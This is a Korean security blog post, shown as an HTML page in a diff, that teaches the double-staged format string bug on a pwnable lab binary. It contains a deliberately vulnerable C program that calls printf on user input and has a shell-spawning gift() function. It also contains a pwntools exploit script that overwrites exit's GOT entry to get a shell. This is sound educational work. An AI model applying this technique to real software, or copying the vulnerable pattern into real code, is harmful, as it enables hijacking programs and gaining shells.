@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] DSFSB · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Double State Format String Bug버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include ">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-dsfsb/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-dsfsb/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-dsfsb/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] DSFSB · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Double State Format String Bug버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include "><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-dsfsb/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] DSFSB","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Double State Format String Bug버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include ","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-dsfsb/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-dsfsb/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] DSFSB</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Double State Format String Bug버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include </p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<h4><strong>Double State Format String Bug</strong></h4>
+<p>버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다.</p>
+<pre><code>//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char buf[128];
+
+void gift() {
+    printf(&quot;Hello! ZZoMblE&quot;);
+    system(&quot;/bin/sh&quot;);
+}
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+    char str[128] = &quot;Hello! whrd\n&quot;;
+    printf(&quot;%s&quot;,str);
+    puts(&quot;input 1 : &quot;);
+    read(0,buf,128);
+    printf(buf);
+
+    puts(&quot;input 2 : &quot;);
+    read(0,buf,128);
+    printf(buf);
+
+    exit(0);
+}
+int main() {
+    initialize();
+    vuln();
+    return 0;
+}
+</code></pre>
+<p>바로 위 예제를 가지고 살펴보겠다.</p>
+<p>vuln()에서 fsb 취약점이 2개가 터지는 것을 확인할 수 있다.</p>
+<p>이전의 fsb와는 다르게 read()를 통해 입력받는 버퍼가 지역 변수가 아닌 전역 변수이기 때문에 아래의 방식을 사용할 수가 없다.</p>
+<pre><code>%1234c%20$n0x401010
+</code></pre>
+<p>이런 경우 메모리가 다시 메모리를 가리키는 부분을 활용해야 한다.</p>
+<p>이게 무슨 말인지 이해를 돕기 위해 아래 예제를 살펴보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/001.png" alt=""></p>
+<p>메모리가 메모리를 가리킨다라고 표현반 부분은 위 그림을 기준으로 vuln()의 sfp같은 부분을 의미한다.</p>
+<p>vuln()의 sfp는 main()의 sfp를 가리키고 있다. 꼭 sfp가 아니어도 메모리가 쓰기 가능한 다른 메모리 영역을 가리키고 있으면 활용이 가능하다.</p>
+<p>그럼 어떤 방법으로 해야할까??</p>
+<p>크게 2가지 과정을 거쳐야 한다. 먼저 main()의 sfp에 exit()의 GOT 주소를 넣어준다. 이후 해당 offset을 계산하여 gift()로 덮어주면 dsfsb를 통한 GOT Overwrite를 수행할 수 있다.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+
+gift = e.sym['gift']
+exit_got = e.got['exit']
+
+payload = '%{}c'.format(exit_got)
+payload += '%22$n'
+
+p.sendafter(b':', payload)
+
+payload = '%{}c'.format(gift)
+payload += '%24$n'
+p.sendafter(b':', payload)
+
+p.interactive()
+</code></pre>
+<p>페이로드는 위와 같이 매우 단순하다.</p>
+<p>첫 번째 payload를 보내고 나면 main()의 sfp가 아래와 같이 변경되어 있는 것을 확인할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/002.png" alt=""></p>
+<p>두번째 payload를 보내고 나면 아래와 같이 exit()의 GOT 값이 변조된 것을 확인할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/003.png" alt=""></p>
+<p>최종적으로 아래와 같이 gift()가 실행되어 셸을 얻을 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/004.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-dsfsb/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
